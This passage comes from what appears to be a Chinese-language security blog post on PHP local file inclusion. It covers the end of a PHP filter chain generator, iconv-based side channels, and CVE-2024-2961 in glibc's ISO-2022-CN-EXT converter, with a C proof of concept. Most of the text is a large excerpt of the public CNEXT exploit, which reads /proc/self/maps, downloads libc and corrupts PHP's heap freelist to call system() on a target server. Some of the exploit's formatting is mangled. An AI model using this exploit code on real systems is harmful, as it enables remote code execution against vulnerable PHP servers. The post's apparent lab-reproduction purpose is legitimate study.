class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parsing command line arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        chain = generate_filter_chain(base64_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))</span><br><span class="line">        <span class="built_in">print</span>(chain)</span><br><span class="line">    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">match</span>):</span><br><span class="line">            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(chain)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>用法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_generator.py --chain &#x27;xxx&#x27;</span><br></pre></td></tr></table></figure>
+<h1><span id="侧信道"> 侧信道</span></h1>
+<p>由LFI的<code>iconv</code>的<code>filter</code>引发出了另外一个攻击方式——侧信道。</p>
+<p>能够利用到php伪协议的函数包括但不限制于include，例如<code>file_get_contents()</code>、<code>file()</code>这些读取函数但是无回显的内容也能够利用<code>file_get_contents()</code>。</p>
+<p>使用<code>convert.iconv.UTF8.UCS-4LE</code>可能会造成php资源的溢出。因为<code>php.ini</code>中的<code>memory_limit</code>限制了读取的资源大小，默认值为<code>128MB</code>，如果超过此大小，就会导致错误，使得服务器返回<code>500</code>的响应码。</p>
+<p>经典老文：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkWD875KL4jxDv3x">PHP Filter链——基于oracle的文件读取攻击 - 先知社区 (aliyun.com)</a></p>
+<img src="/posts/undefined/1.jpg" class title="awa">
+<p>最后采用<code>dechunk</code>进行分块传输编码逐步读取文件的字符即可。</p>
+<p>所有能够受到影响的函数如下：</p>
+<img src="/posts/undefined/2.png" class title="awa">
+<h1><span id="lfi-to-rce"> LFI to RCE</span></h1>
+<p>铺垫了这么久，终于进入到正题了。上面讲过了我们的所有能够被<code>filter chain</code>影响的函数都会有这个洞。当<code>php</code>进行字符集转换的时候，它会去调用<code>iconv()</code>函数。这是一个<strong>使用转换描述符将输入缓冲区中的字符转换为输出缓冲区</strong>的api，前面加黑的字体很难懂，反正就是缓冲区的东西。而在linux上，这个<code>api</code>采用<a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/"><code>glibc</code></a>实现，<code>iconv()</code>函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">iconv</span><span class="params">(<span class="type">iconv_t</span> cd,</span></span><br><span class="line"><span class="params">            <span class="type">char</span> **<span class="keyword">restrict</span> inbuf, <span class="type">size_t</span> *<span class="keyword">restrict</span> inbytesleft,</span></span><br><span class="line"><span class="params">            <span class="type">char</span> **<span class="keyword">restrict</span> outbuf, <span class="type">size_t</span> *<span class="keyword">restrict</span> outbytesleft)</span>;</span><br></pre></td></tr></table></figure>
+<p>如果输出缓冲区不够大，<code>iconv()</code>就会报错，这个时候可以重新分配<code>outbuf</code>并且再次调用<code>iconv()</code>，确保永远不会从输入缓冲区读取超过或者向输出缓冲区写入超过<code>inbytesleft</code>或者<code>outbytesleft</code>的数据。也就是通过分配，能够确保不会触发溢出问题</p>
+<p>但是有一个字符集打破了这一<strong>永远</strong>。</p>
+<h2><span id="iso-2022-cn-ext"> ISO-2022-CN-EXT</span></h2>
+<p>没错，又是我们的中文字符。果然中华文字博大精深(x)</p>
+<p>该字符集存于：<code>glibc/iconvdata/iso-2022-cn-ext.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS2_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="number">8</span>))\</span><br><span class="line">          &#123;                                      \</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *escseq;                          \</span><br><span class="line">                                          \</span><br><span class="line">        assert (used == CNS11643_2_set); <span class="comment">/* XXX */</span>              \</span><br><span class="line">        escseq = <span class="string">&quot;*H&quot;</span>;                              \</span><br><span class="line">        *outptr++ = ESC;                          \</span><br><span class="line">        *outptr++ = <span class="string">&#x27;$&#x27;</span>;                          \</span><br><span class="line">        *outptr++ = *escseq++;                          \</span><br><span class="line">        *outptr++ = *escseq++;                          \</span><br><span class="line">                                          \</span><br><span class="line">        ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="number">8</span>);                  \</span><br><span class="line">          &#125;                                      \</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS3_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="number">8</span>))\</span><br><span class="line">          &#123;                                      \</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *escseq;                          \</span><br><span class="line">                                          \</span><br><span class="line">        assert ((used &gt;&gt; <span class="number">5</span>) &gt;= <span class="number">3</span> &amp;&amp; (used &gt;&gt; <span class="number">5</span>) &lt;= <span class="number">7</span>);              \</span><br><span class="line">        escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;              \</span><br><span class="line">        *outptr++ = ESC;                          \</span><br><span class="line">        *outptr++ = <span class="string">&#x27;$&#x27;</span>;                          \</span><br><span class="line">        *outptr++ = *escseq++;                          \</span><br><span class="line">        *outptr++ = *escseq++;                          \</span><br><span class="line">                                          \</span><br><span class="line">        ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="number">8</span>);                  \</span><br><span class="line">          &#125;        </span><br></pre></td></tr></table></figure>
+<p>看两个<code>else if</code>的<code>*outptr</code>。它会将要转换的字符输入转换成四字节的输出，并且没有做任何的检验就输出。</p>
+<p>这样有可能会产生出六种输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\x1b$*H        0x1b 0x24 0x2A 0x48</span><br><span class="line">\x1b$+I        0x1b 0x24 0x2b 0x49</span><br><span class="line">\x1b$+J        0x1b 0x24 0x2b 0x4a</span><br><span class="line">\x1b$+K        0x1b 0x24 0x2b 0x4b</span><br><span class="line">\x1b$+L        0x1b 0x24 0x2b 0x4c</span><br><span class="line">\x1b$+M        0x1b 0x24 0x2b 0x4d</span><br></pre></td></tr></table></figure>
+<p>这里会出现什么问题呢，直接转换成四字节，就有可能会对我们的iconv所限制的空间产生溢出。</p>
+<p>一个简单的poc：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CVE-2024-2961 POC</span></span><br><span class="line"><span class="comment">$ gcc -o poc ./poc.c &amp;&amp; ./poc</span></span><br><span class="line"><span class="comment">Remaining bytes (should be &gt; 0): -1</span></span><br><span class="line"><span class="comment">$</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iconv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">int</span> buflen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf = (<span class="type">unsigned</span> <span class="type">char</span> *)ptr;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; buflen; i += <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%06x: &quot;</span>, i);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; buflen)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, buf[i + j]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; buflen)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf[i + j]) ? buf[i + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">iconv_t</span> cd = iconv_open(<span class="string">&quot;ISO-2022-CN-EXT&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> input[<span class="number">0x10</span>] = <span class="string">&quot;AAAAA劄&quot;</span>;</span><br><span class="line">    <span class="type">char</span> output[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *pinput = input;</span><br><span class="line">    <span class="type">char</span> *poutput = output;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Same size for input and output buffer</span></span><br><span class="line">    <span class="type">size_t</span> sinput = <span class="built_in">strlen</span>(input);</span><br><span class="line">    <span class="type">size_t</span> soutput = sinput;</span><br><span class="line"></span><br><span class="line">    iconv(cd, &amp;pinput, &amp;sinput, &amp;poutput, &amp;soutput);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Remaining bytes (should be &gt; 0): %zd\n&quot;</span>, soutput);</span><br><span class="line"></span><br><span class="line">    hexdump(output, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>hexdump</code>就是打印出输出的字节，没有其他含义。</p>
+<p>主要看我们的main函数。main这里的input是一个<code>AAAAA劄</code>，其中这个<code>劄</code>我们利用python来打印一下他的字节：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;劄&quot;</span>.encode())</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/3.png" class title="awa">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\xe5\x8a\x84&#x27;</span><br></pre></td></tr></table></figure>
+<p>原本是一个三字节的字符，但是经过该字符集转换后会转换成四字节的输出。</p>
+<p>因此即使限制了<code>soutput</code>为<code>strlen(input)</code>，也就是8的时候，也会溢出一字节。编译并运行该poc会得到如下的结果：</p>
+<img src="/posts/undefined/4.png" class title="awa">
+<p>可以看到我们确实溢出了1bytes。</p>
+<p>要想将其利用，我们还得需要<code>php heap</code>(php堆)，简单地说就是读取<code>/proc/self/maps</code>，并且从中提取到<code>PHP堆地址</code>和<code>libc库文件名</code>，接着下载libc二进制文件并得到system函数的地址并且打rce即可。</p>
+<h1><span id="简单复现"> 简单复现</span></h1>
+<p>简单去vulhub下一个docker镜像复现一下exp即可</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">exploit</a>：</p>
+<p>这个提供的示例已经进行了一些注释的标注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    ```php</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">    echo &quot;File contents: $data&quot;;</span></span><br></pre></td></tr></table></figure>
+<pre><code>Tweak it to fit your target, and start the exploit.
+&quot;&quot;&quot;
+
+def __init__(self, url: str) -&gt; None:
+    self.url = url
+    self.session = Session()
+
+def send(self, path: str) -&gt; Response:
+    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
+    &quot;&quot;&quot;
+    
+    #这里的post的参数名需要根据实际更改
+    
+    return self.session.post(self.url, data=&#123;&quot;file&quot;: path&#125;)
+    
+def download(self, path: str) -&gt; bytes:
+    &quot;&quot;&quot;Returns the contents of a remote file.
+    &quot;&quot;&quot;
+    
+    #这里的path读文件也是需要根据实际需要更改
+    #path = f&quot;file://localhost/&#123;path&#125;&quot;
+    
+    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+    response = self.send(path)
+    #这里返回的data也是根据实际情况来查找页面内容，最好是自己先尝试读取/proc/self/maps后根据得到的内容进行提取
+    data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)
+    return base64.decode(data)
+</code></pre>
+<p>@entry<br>
+@arg(“url”, “Target URL”)<br>
+@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)<br>
+@arg(“sleep_time”, “Time to sleep to assert that the exploit worked. By default, 1.”)<br>
+@arg(“heap”, “Address of the main zend_mm_heap structure.”)<br>
+@arg(<br>
+“pad”,<br>
+“Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;<br>
+“operations with this size, increase this. Defaults to 20.”,<br>
+)<br>
+@dataclass<br>
+class Exploit:<br>
+“”“CNEXT exploit: RCE using a file read primitive in PHP.””&quot;</p>
+<pre><code>url: str
+command: str
+sleep: int = 1
+heap: str = None
+pad: int = 20
+
+def __post_init__(self):
+    self.remote = Remote(self.url)
+    self.log = logger(&quot;EXPLOIT&quot;)
+    self.info = &#123;&#125;
+    self.heap = self.heap and int(self.heap, 16)
+
+def check_vulnerable(self) -&gt; None:
+    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
+    wrappers and filters that the exploit needs.
+    &quot;&quot;&quot;
+    
+    def safe_download(path: str) -&gt; bytes:
+        try:
+            return self.remote.download(path)
+        except ConnectionError:
+            failure(&quot;Target not [b]reachable[/] ?&quot;)
+        
+
+    def check_token(text: str, path: str) -&gt; bool:
+        result = safe_download(path)
+        return text.encode() == result
+
+    text = tf.random.string(50).encode()
+    base64 = b64(text, misalign=True).decode()
+    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;
+    
+    result = safe_download(path)
+    
+    if text not in result:
+        msg_failure(&quot;Remote.download did not return the test string&quot;)
+        print(&quot;--------------------&quot;)
+        print(f&quot;Expected test string: &#123;text&#125;&quot;)
+        print(f&quot;Got: &#123;result&#125;&quot;)
+        print(&quot;--------------------&quot;)
+        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)
+
+    msg_info(&quot;The [i]data://[/] wrapper works&quot;)
+
+    text = tf.random.string(50)
+    base64 = b64(text.encode(), misalign=True).decode()
+    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;
+    if not check_token(text, path):
+        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)
+
+    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)
+
+    text = tf.random.string(50)
+    base64 = b64(compress(text.encode()), misalign=True).decode()
+    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;
+
+    if not check_token(text, path):
+        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)
+
+    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)
+
+    msg_success(&quot;Exploit preconditions are satisfied&quot;)
+
+def get_file(self, path: str) -&gt; bytes:
+    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):
+        return self.remote.download(path)
+
+def get_regions(self) -&gt; list[Region]:
+    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
+    maps = self.get_file(&quot;/proc/self/maps&quot;)
+    maps = maps.decode()
+    PATTERN = re.compile(
+        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;
+    )
+    regions = []
+    for region in table.split(maps, strip=True):
+        if match := PATTERN.match(region):
+            start = int(match.group(1), 16)
+            stop = int(match.group(2), 16)
+            permissions = match.group(3)
+            path = match.group(4)
+            if &quot;/&quot; in path or &quot;[&quot; in path:
+                path = path.rsplit(&quot; &quot;, 1)[-1]
+            else:
+                path = &quot;&quot;
+            current = Region(start, stop, permissions, path)
+            regions.append(current)
+        else:
+            print(maps)
+            failure(&quot;Unable to parse memory mappings&quot;)
+
+    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)
+
+    return regions
+
+def get_symbols_and_addresses(self) -&gt; None:
+    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
+    regions = self.get_regions()
+
+    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;
+
+    # PHP's heap
+
+    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)
+
+    # Libc
+
+    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)
+
+    self.download_file(libc.path, LIBC_FILE)
+
+    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
+    self.info[&quot;libc&quot;].address = libc.start
+
+def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
+    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
+    for region in regions:
+        if any(name in region.path for name in names):
+            break
+    else:
+        failure(&quot;Unable to locate region&quot;)
+
+    return region
+
+def download_file(self, remote_path: str, local_path: str) -&gt; None:
+    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
+    data = self.get_file(remote_path)
+    Path(local_path).write(data)
+
+def find_main_heap(self, regions: list[Region]) -&gt; Region:
+    # Any anonymous RW region with a size superior to the base heap size is a
+    # candidate. The heap is at the bottom of the region.
+    heaps = [
+        region.stop - HEAP_SIZE + 0x40
+        for region in reversed(regions)
+        if region.permissions == &quot;rw-p&quot;
+        and region.size &gt;= HEAP_SIZE
+        and region.stop &amp; (HEAP_SIZE-1) == 0
+        and region.path == &quot;&quot;
+    ]
+
+    if not heaps:
+        failure(&quot;Unable to find PHP's main heap in memory&quot;)
+
+    first = heaps[0]
+
+    if len(heaps) &gt; 1:
+        heaps = &quot;, &quot;.join(map(hex, heaps))
+        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)
+    else:
+        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)
+
+    return first
+
+def run(self) -&gt; None:
+    self.check_vulnerable()
+    self.get_symbols_and_addresses()
+    self.exploit()
+
+def build_exploit_path(self) -&gt; str:
+    &quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the
+    other. Processing generally involves making some kind of operation either
+    on the chunk or in a destination chunk of the same size. Each operation is
+    applied on every single chunk; you cannot make PHP apply iconv on the first 10
+    chunks and leave the rest in place. That's where the difficulties come from.
+
+    Keep in mind that we know the address of the main heap, and the libraries.
+    ASLR/PIE do not matter here.
+
+    The idea is to use the bug to make the freelist for chunks of size 0x100 point
+    lower. For instance, we have the following free list:
+
+    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00
+
+    By triggering the bug from chunk ..900, we get:
+
+    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???
+
+    That's step 3.
+
+    Now, in order to control the free list, and make it point whereever we want,
+    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
+    we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
+    That's step 2.
+
+    Now, if we were to perform step2 an then step3 without anything else, we'd have
+    a problem: after step2 has been processed, the free list goes bottom-up, like:
+
+    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900
+
+    We need to go the other way around. That's why we have step 1: it just allocates
+    chunks. When they get freed, they reverse the free list. Now step2 allocates in
+    reverse order, and therefore after step2, chunks are in the correct order.
+
+    Another problem comes up.
+
+    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
+    Since step2 creates chunks that contain pointers and pointers are generally not
+    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
+    To avoid this, we put the chunks in step2 at the very end of the chain, and
+    prefix them with `0\n`. When dechunked (right before the iconv), they will
+    &quot;disappear&quot; from the chain, preserving them from the character set conversion
+    and saving us from an unwanted processing error that would stop the processing
+    chain.
+
+    After step3 we have a corrupted freelist with an arbitrary pointer into it. We
+    don't know the precise layout of the heap, but we know that at the top of the
+    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
+    Its free_slot[] array contains a pointer to each free list. By overwriting it,
+    we can make PHP allocate chunks whereever we want. In addition, its custom_heap
+    field contains pointers to hook functions for emalloc, efree, and erealloc
+    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
+    then overwrite the use_custom_heap flag to make PHP use these function pointers
+    instead. We can now do our favorite CTF technique and get a call to
+    system(&lt;chunk&gt;).
+    We make sure that the &quot;system&quot; command kills the current process to avoid other
+    system() calls with random chunk data, leading to undefined behaviour.
+
+    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
+    process is in a random state, we still get contiguous, in order chunks for our
+    exploit.
+
+    Therefore, the whole process described here CANNOT crash. Everything falls
+    perfectly in place, and nothing can get in the middle of our allocations.
+    &quot;&quot;&quot;
+
+    LIBC = self.info[&quot;libc&quot;]
+    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
+    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
+    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]
+
+    ADDR_HEAP = self.info[&quot;heap&quot;]
+    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
+    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
+
